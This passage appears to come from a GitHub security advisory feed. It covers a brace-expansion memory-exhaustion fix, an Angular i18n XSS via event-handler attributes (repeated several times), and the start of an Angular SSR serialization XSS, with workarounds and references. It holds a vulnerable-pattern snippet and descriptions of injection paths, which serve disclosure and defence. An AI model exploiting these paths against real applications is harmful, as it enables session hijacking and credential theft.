<p>Both intermediate arrays are now bounded as they are built, using the same <code>max</code> and <code>maxLength</code> limits already applied in <code>combine()</code>:</p>
<ul>
<li><code>values</code> tracks a running result count and character length while alternatives are appended, and stops once either bound is reached.</li>
<li><code>expandSequence()</code> accepts <code>maxLength</code> and stops generating once the sequence's own characters reach it.</li>
</ul>
<p>As with the existing limits, output is truncated rather than allowed to grow without bound, which matches how <code>max</code> already behaves. The defaults sit well above any realistic expansion, so legitimate input is unaffected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, avoid passing untrusted input to <code>expand()</code> or to glob brace patterns, or pass an explicitly small <code>max</code> <strong>and</strong> <code>maxLength</code>.</p>
<p>Note that a small <code>maxLength</code> alone was not sufficient on affected versions: it was applied per alternative rather than cumulatively, which is the root of the first issue above.</p>
<h3 id="credits">Credits</h3>
<p>The memory-exhaustion bypass was reported by Alessio Della Libera, CEO &amp; Co-founder at <a href="https://numyra.ai/">Numyra</a>.</p>
<p>The sequence-generation issue was found while verifying that report.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d">https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac">https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf">https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031">https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031</a></li>
<li><a href="https://github.com/advisories/GHSA-rgw5-rvv9-x895">https://github.com/advisories/GHSA-rgw5-rvv9-x895</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgw5-rvv9-x895</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:35:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/core] Angular i18n: Cross-Site Scripting (XSS) via event-handler attributes]]></title>
        <id>https://github.com/advisories/GHSA-jj27-h5hq-8x99</id>
        <link href="https://github.com/advisories/GHSA-jj27-h5hq-8x99"/>
        <updated>2026-08-03T16:23:41.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability has been identified in the Angular compiler's internationalization (i18n) pipeline. Although Angular disallows binding to event-handler attributes such as <code>onclick</code> and <code>onerror</code> through standard attribute validation (<code>validateAttribute()</code> / <code>validateProperty()</code>), the i18n metadata collection path allowed these same attribute names to be marked for translation using <code>i18n-on*</code> attributes (e.g., <code>i18n-onerror</code>).</p>
<p>When exploited, a lower-trust translation file could replace a benign static handler such as <code>onerror="void 0"</code> with arbitrary executable JavaScript in the localized build.</p>
<p>The following example illustrates a vulnerable pattern:</p>
<pre><code class="language-html">&lt;img src="foo.jpg" onerror="void 0" i18n-onerror /&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>When exploited, this vulnerability allows arbitrary JavaScript execution within the context of the vulnerable application's domain if an attacker can control or influence the translation files used during localization. This can lead to:</p>
<ul>
<li><strong>Session Hijacking</strong>: Accessing session cookies, tokens, or sensitive user data.</li>
<li><strong>Unauthorized Actions</strong>: Performing actions on behalf of the authenticated user.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that static event-handler attributes (e.g., <code>onerror</code>, <code>onclick</code>) are never marked for internationalization (<code>i18n-on*</code>) in application templates, and ensure translation files are sourced from trusted origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99">https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99</a></li>
<li><a href="https://github.com/angular/angular/pull/68821">https://github.com/angular/angular/pull/68821</a></li>
<li><a href="https://github.com/angular/angular/pull/69306">https://github.com/angular/angular/pull/69306</a></li>
<li><a href="https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e">https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e</a></li>
<li><a href="https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865">https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865</a></li>
<li><a href="https://github.com/advisories/GHSA-jj27-h5hq-8x99">https://github.com/advisories/GHSA-jj27-h5hq-8x99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj27-h5hq-8x99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:23:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/core] Angular i18n: Cross-Site Scripting (XSS) via event-handler attributes]]></title>
        <id>https://github.com/advisories/GHSA-jj27-h5hq-8x99</id>
        <link href="https://github.com/advisories/GHSA-jj27-h5hq-8x99"/>
        <updated>2026-08-03T16:23:41.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability has been identified in the Angular compiler's internationalization (i18n) pipeline. Although Angular disallows binding to event-handler attributes such as <code>onclick</code> and <code>onerror</code> through standard attribute validation (<code>validateAttribute()</code> / <code>validateProperty()</code>), the i18n metadata collection path allowed these same attribute names to be marked for translation using <code>i18n-on*</code> attributes (e.g., <code>i18n-onerror</code>).</p>
<p>When exploited, a lower-trust translation file could replace a benign static handler such as <code>onerror="void 0"</code> with arbitrary executable JavaScript in the localized build.</p>
<p>The following example illustrates a vulnerable pattern:</p>
<pre><code class="language-html">&lt;img src="foo.jpg" onerror="void 0" i18n-onerror /&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>When exploited, this vulnerability allows arbitrary JavaScript execution within the context of the vulnerable application's domain if an attacker can control or influence the translation files used during localization. This can lead to:</p>
<ul>
<li><strong>Session Hijacking</strong>: Accessing session cookies, tokens, or sensitive user data.</li>
<li><strong>Unauthorized Actions</strong>: Performing actions on behalf of the authenticated user.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that static event-handler attributes (e.g., <code>onerror</code>, <code>onclick</code>) are never marked for internationalization (<code>i18n-on*</code>) in application templates, and ensure translation files are sourced from trusted origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99">https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99</a></li>
<li><a href="https://github.com/angular/angular/pull/68821">https://github.com/angular/angular/pull/68821</a></li>
<li><a href="https://github.com/angular/angular/pull/69306">https://github.com/angular/angular/pull/69306</a></li>
<li><a href="https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e">https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e</a></li>
<li><a href="https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865">https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865</a></li>
<li><a href="https://github.com/advisories/GHSA-jj27-h5hq-8x99">https://github.com/advisories/GHSA-jj27-h5hq-8x99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj27-h5hq-8x99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:23:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/core] Angular i18n: Cross-Site Scripting (XSS) via event-handler attributes]]></title>
        <id>https://github.com/advisories/GHSA-jj27-h5hq-8x99</id>
        <link href="https://github.com/advisories/GHSA-jj27-h5hq-8x99"/>
        <updated>2026-08-03T16:23:41.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability has been identified in the Angular compiler's internationalization (i18n) pipeline. Although Angular disallows binding to event-handler attributes such as <code>onclick</code> and <code>onerror</code> through standard attribute validation (<code>validateAttribute()</code> / <code>validateProperty()</code>), the i18n metadata collection path allowed these same attribute names to be marked for translation using <code>i18n-on*</code> attributes (e.g., <code>i18n-onerror</code>).</p>
<p>When exploited, a lower-trust translation file could replace a benign static handler such as <code>onerror="void 0"</code> with arbitrary executable JavaScript in the localized build.</p>
<p>The following example illustrates a vulnerable pattern:</p>
<pre><code class="language-html">&lt;img src="foo.jpg" onerror="void 0" i18n-onerror /&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>When exploited, this vulnerability allows arbitrary JavaScript execution within the context of the vulnerable application's domain if an attacker can control or influence the translation files used during localization. This can lead to:</p>
<ul>
<li><strong>Session Hijacking</strong>: Accessing session cookies, tokens, or sensitive user data.</li>
<li><strong>Unauthorized Actions</strong>: Performing actions on behalf of the authenticated user.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that static event-handler attributes (e.g., <code>onerror</code>, <code>onclick</code>) are never marked for internationalization (<code>i18n-on*</code>) in application templates, and ensure translation files are sourced from trusted origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99">https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99</a></li>
<li><a href="https://github.com/angular/angular/pull/68821">https://github.com/angular/angular/pull/68821</a></li>
<li><a href="https://github.com/angular/angular/pull/69306">https://github.com/angular/angular/pull/69306</a></li>
<li><a href="https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e">https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e</a></li>
<li><a href="https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865">https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865</a></li>
<li><a href="https://github.com/advisories/GHSA-jj27-h5hq-8x99">https://github.com/advisories/GHSA-jj27-h5hq-8x99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj27-h5hq-8x99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:23:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/core] Angular i18n: Cross-Site Scripting (XSS) via event-handler attributes]]></title>
        <id>https://github.com/advisories/GHSA-jj27-h5hq-8x99</id>
        <link href="https://github.com/advisories/GHSA-jj27-h5hq-8x99"/>
        <updated>2026-08-03T16:23:41.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability has been identified in the Angular compiler's internationalization (i18n) pipeline. Although Angular disallows binding to event-handler attributes such as <code>onclick</code> and <code>onerror</code> through standard attribute validation (<code>validateAttribute()</code> / <code>validateProperty()</code>), the i18n metadata collection path allowed these same attribute names to be marked for translation using <code>i18n-on*</code> attributes (e.g., <code>i18n-onerror</code>).</p>
<p>When exploited, a lower-trust translation file could replace a benign static handler such as <code>onerror="void 0"</code> with arbitrary executable JavaScript in the localized build.</p>
<p>The following example illustrates a vulnerable pattern:</p>
<pre><code class="language-html">&lt;img src="foo.jpg" onerror="void 0" i18n-onerror /&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>When exploited, this vulnerability allows arbitrary JavaScript execution within the context of the vulnerable application's domain if an attacker can control or influence the translation files used during localization. This can lead to:</p>
<ul>
<li><strong>Session Hijacking</strong>: Accessing session cookies, tokens, or sensitive user data.</li>
<li><strong>Unauthorized Actions</strong>: Performing actions on behalf of the authenticated user.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that static event-handler attributes (e.g., <code>onerror</code>, <code>onclick</code>) are never marked for internationalization (<code>i18n-on*</code>) in application templates, and ensure translation files are sourced from trusted origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99">https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99</a></li>
<li><a href="https://github.com/angular/angular/pull/68821">https://github.com/angular/angular/pull/68821</a></li>
<li><a href="https://github.com/angular/angular/pull/69306">https://github.com/angular/angular/pull/69306</a></li>
<li><a href="https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e">https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e</a></li>
<li><a href="https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865">https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865</a></li>
<li><a href="https://github.com/advisories/GHSA-jj27-h5hq-8x99">https://github.com/advisories/GHSA-jj27-h5hq-8x99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj27-h5hq-8x99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:23:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/compiler] Angular i18n: Cross-Site Scripting (XSS) via event-handler attributes]]></title>
        <id>https://github.com/advisories/GHSA-jj27-h5hq-8x99</id>
        <link href="https://github.com/advisories/GHSA-jj27-h5hq-8x99"/>
        <updated>2026-08-03T16:23:41.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability has been identified in the Angular compiler's internationalization (i18n) pipeline. Although Angular disallows binding to event-handler attributes such as <code>onclick</code> and <code>onerror</code> through standard attribute validation (<code>validateAttribute()</code> / <code>validateProperty()</code>), the i18n metadata collection path allowed these same attribute names to be marked for translation using <code>i18n-on*</code> attributes (e.g., <code>i18n-onerror</code>).</p>
<p>When exploited, a lower-trust translation file could replace a benign static handler such as <code>onerror="void 0"</code> with arbitrary executable JavaScript in the localized build.</p>
<p>The following example illustrates a vulnerable pattern:</p>
<pre><code class="language-html">&lt;img src="foo.jpg" onerror="void 0" i18n-onerror /&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>When exploited, this vulnerability allows arbitrary JavaScript execution within the context of the vulnerable application's domain if an attacker can control or influence the translation files used during localization. This can lead to:</p>
<ul>
<li><strong>Session Hijacking</strong>: Accessing session cookies, tokens, or sensitive user data.</li>
<li><strong>Unauthorized Actions</strong>: Performing actions on behalf of the authenticated user.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that static event-handler attributes (e.g., <code>onerror</code>, <code>onclick</code>) are never marked for internationalization (<code>i18n-on*</code>) in application templates, and ensure translation files are sourced from trusted origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99">https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99</a></li>
<li><a href="https://github.com/angular/angular/pull/68821">https://github.com/angular/angular/pull/68821</a></li>
<li><a href="https://github.com/angular/angular/pull/69306">https://github.com/angular/angular/pull/69306</a></li>
<li><a href="https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e">https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e</a></li>
<li><a href="https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865">https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865</a></li>
<li><a href="https://github.com/advisories/GHSA-jj27-h5hq-8x99">https://github.com/advisories/GHSA-jj27-h5hq-8x99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj27-h5hq-8x99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:23:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/compiler] Angular i18n: Cross-Site Scripting (XSS) via event-handler attributes]]></title>
        <id>https://github.com/advisories/GHSA-jj27-h5hq-8x99</id>
        <link href="https://github.com/advisories/GHSA-jj27-h5hq-8x99"/>
        <updated>2026-08-03T16:23:41.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability has been identified in the Angular compiler's internationalization (i18n) pipeline. Although Angular disallows binding to event-handler attributes such as <code>onclick</code> and <code>onerror</code> through standard attribute validation (<code>validateAttribute()</code> / <code>validateProperty()</code>), the i18n metadata collection path allowed these same attribute names to be marked for translation using <code>i18n-on*</code> attributes (e.g., <code>i18n-onerror</code>).</p>
<p>When exploited, a lower-trust translation file could replace a benign static handler such as <code>onerror="void 0"</code> with arbitrary executable JavaScript in the localized build.</p>
<p>The following example illustrates a vulnerable pattern:</p>
<pre><code class="language-html">&lt;img src="foo.jpg" onerror="void 0" i18n-onerror /&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>When exploited, this vulnerability allows arbitrary JavaScript execution within the context of the vulnerable application's domain if an attacker can control or influence the translation files used during localization. This can lead to:</p>
<ul>
<li><strong>Session Hijacking</strong>: Accessing session cookies, tokens, or sensitive user data.</li>
<li><strong>Unauthorized Actions</strong>: Performing actions on behalf of the authenticated user.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that static event-handler attributes (e.g., <code>onerror</code>, <code>onclick</code>) are never marked for internationalization (<code>i18n-on*</code>) in application templates, and ensure translation files are sourced from trusted origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99">https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99</a></li>
<li><a href="https://github.com/angular/angular/pull/68821">https://github.com/angular/angular/pull/68821</a></li>
<li><a href="https://github.com/angular/angular/pull/69306">https://github.com/angular/angular/pull/69306</a></li>
<li><a href="https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e">https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e</a></li>
<li><a href="https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865">https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865</a></li>
<li><a href="https://github.com/advisories/GHSA-jj27-h5hq-8x99">https://github.com/advisories/GHSA-jj27-h5hq-8x99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj27-h5hq-8x99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:23:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/compiler] Angular i18n: Cross-Site Scripting (XSS) via event-handler attributes]]></title>
        <id>https://github.com/advisories/GHSA-jj27-h5hq-8x99</id>
        <link href="https://github.com/advisories/GHSA-jj27-h5hq-8x99"/>
        <updated>2026-08-03T16:23:41.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability has been identified in the Angular compiler's internationalization (i18n) pipeline. Although Angular disallows binding to event-handler attributes such as <code>onclick</code> and <code>onerror</code> through standard attribute validation (<code>validateAttribute()</code> / <code>validateProperty()</code>), the i18n metadata collection path allowed these same attribute names to be marked for translation using <code>i18n-on*</code> attributes (e.g., <code>i18n-onerror</code>).</p>
<p>When exploited, a lower-trust translation file could replace a benign static handler such as <code>onerror="void 0"</code> with arbitrary executable JavaScript in the localized build.</p>
<p>The following example illustrates a vulnerable pattern:</p>
<pre><code class="language-html">&lt;img src="foo.jpg" onerror="void 0" i18n-onerror /&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>When exploited, this vulnerability allows arbitrary JavaScript execution within the context of the vulnerable application's domain if an attacker can control or influence the translation files used during localization. This can lead to:</p>
<ul>
<li><strong>Session Hijacking</strong>: Accessing session cookies, tokens, or sensitive user data.</li>
<li><strong>Unauthorized Actions</strong>: Performing actions on behalf of the authenticated user.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that static event-handler attributes (e.g., <code>onerror</code>, <code>onclick</code>) are never marked for internationalization (<code>i18n-on*</code>) in application templates, and ensure translation files are sourced from trusted origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99">https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99</a></li>
<li><a href="https://github.com/angular/angular/pull/68821">https://github.com/angular/angular/pull/68821</a></li>
<li><a href="https://github.com/angular/angular/pull/69306">https://github.com/angular/angular/pull/69306</a></li>
<li><a href="https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e">https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e</a></li>
<li><a href="https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865">https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865</a></li>
<li><a href="https://github.com/advisories/GHSA-jj27-h5hq-8x99">https://github.com/advisories/GHSA-jj27-h5hq-8x99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj27-h5hq-8x99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:23:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/compiler] Angular i18n: Cross-Site Scripting (XSS) via event-handler attributes]]></title>
        <id>https://github.com/advisories/GHSA-jj27-h5hq-8x99</id>
        <link href="https://github.com/advisories/GHSA-jj27-h5hq-8x99"/>
        <updated>2026-08-03T16:23:41.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability has been identified in the Angular compiler's internationalization (i18n) pipeline. Although Angular disallows binding to event-handler attributes such as <code>onclick</code> and <code>onerror</code> through standard attribute validation (<code>validateAttribute()</code> / <code>validateProperty()</code>), the i18n metadata collection path allowed these same attribute names to be marked for translation using <code>i18n-on*</code> attributes (e.g., <code>i18n-onerror</code>).</p>
<p>When exploited, a lower-trust translation file could replace a benign static handler such as <code>onerror="void 0"</code> with arbitrary executable JavaScript in the localized build.</p>
<p>The following example illustrates a vulnerable pattern:</p>
<pre><code class="language-html">&lt;img src="foo.jpg" onerror="void 0" i18n-onerror /&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>When exploited, this vulnerability allows arbitrary JavaScript execution within the context of the vulnerable application's domain if an attacker can control or influence the translation files used during localization. This can lead to:</p>
<ul>
<li><strong>Session Hijacking</strong>: Accessing session cookies, tokens, or sensitive user data.</li>
<li><strong>Unauthorized Actions</strong>: Performing actions on behalf of the authenticated user.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that static event-handler attributes (e.g., <code>onerror</code>, <code>onclick</code>) are never marked for internationalization (<code>i18n-on*</code>) in application templates, and ensure translation files are sourced from trusted origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99">https://github.com/angular/angular/security/advisories/GHSA-jj27-h5hq-8x99</a></li>
<li><a href="https://github.com/angular/angular/pull/68821">https://github.com/angular/angular/pull/68821</a></li>
<li><a href="https://github.com/angular/angular/pull/69306">https://github.com/angular/angular/pull/69306</a></li>
<li><a href="https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e">https://github.com/angular/angular/commit/417a4071a776464d549509ed3aec121dbd2fda5e</a></li>
<li><a href="https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865">https://github.com/angular/angular/commit/6c41f5ca01c0ae045fc7d929b72853a11eb55865</a></li>
<li><a href="https://github.com/advisories/GHSA-jj27-h5hq-8x99">https://github.com/advisories/GHSA-jj27-h5hq-8x99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj27-h5hq-8x99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:23:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] Angular SSR: Missing Fallback Raw-Content Serialization Escaping leads to Cross-Site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</id>
        <link href="https://github.com/advisories/GHSA-vpx6-8pjr-4g3v"/>
        <updated>2026-08-03T16:14:45.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability exists in <code>@angular/platform-server</code>'s DOM emulation dependency (<code>domino</code>) when serializing the content of fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, and <code>&lt;noscript&gt;</code>).</p>
<p>When rendering dynamic text content inside fallback raw-content elements via template bindings, the template engine expects the browser to render the content safely. Under Server-Side Rendering (SSR), <code>domino</code> is configured with scripting enabled, meaning these elements are treated as raw-text elements.</p>
<p>However, <code>domino</code>'s serializer previously did not escape text nodes within fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>) during DOM serialization. As a result, any occurrence of closing tags in the bound dynamic text was not escaped.</p>
<p>The unescaped closing tag could be serialized directly into the output HTML. When parsed by a browser or re-parsed during SSR post-processing without preserving raw-content parser state, an injected closing tag closes the element early, allowing an injected script block to execute in the user's browser context, causing same-origin Cross-Site Scripting (XSS).</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to perform same-origin Cross-Site Scripting (XSS) attacks against any user visiting an SSR-rendered page that binds user-controlled data inside fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>). This can lead to session hijacking, credentials theft, unauthorized actions on behalf of users, and defacement.</p>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.7</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot immediately update your dependencies, you can mitigate this issue using any of the following approaches:</p>
<ul>
<li><strong>Disable critical CSS inlining</strong>: Critical CSS inlining in Angular SSR post-processes the rendered HTML using <code>domino</code>. Disabling this step prevents <code>domino</code> from re-parsing and re-serializing the HTML during server-side rendering.<ul>
<li>In <code>angular.json</code>, set <code>inlineCritical</code> to <code>false</code> under style optimization options:<pre><code class="language-json">{
  "projects": {
    "my-app": {
      "architect": {
        "build": {
          "builder": "@angular/build:application",
          "options": {
            "optimization": {
              "styles": {
                "inlineCritical": false
              }
            }
          }
        }
      }
    }
  }
}
</code></pre>
</li>
<li>When rendering programmatically with <code>CommonEngine</code>, set <code>inlineCriticalCss: false</code> in your render options.</li>
</ul>
</li>
<li><strong>Avoid binding user-controlled values</strong> inside fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>).</li>
<li><strong>Sanitize user input</strong> placed inside these elements to explicitly strip or escape closing tags before passing it to the template.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v">https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v</a></li>
<li><a href="https://github.com/angular/angular/pull/69675">https://github.com/angular/angular/pull/69675</a></li>
<li><a href="https://github.com/angular/angular/pull/69714">https://github.com/angular/angular/pull/69714</a></li>
<li><a href="https://github.com/angular/angular/pull/69929">https://github.com/angular/angular/pull/69929</a></li>
<li><a href="https://github.com/angular/angular/pull/69930">https://github.com/angular/angular/pull/69930</a></li>
<li><a href="https://github.com/angular/domino/pull/32">https://github.com/angular/domino/pull/32</a></li>
<li><a href="https://github.com/angular/domino/commit/f88e5aa49cf2804d7c2df22ef1640eb4ec43dd56">https://github.com/angular/domino/commit/f88e5aa49cf2804d7c2df22ef1640eb4ec43dd56</a></li>
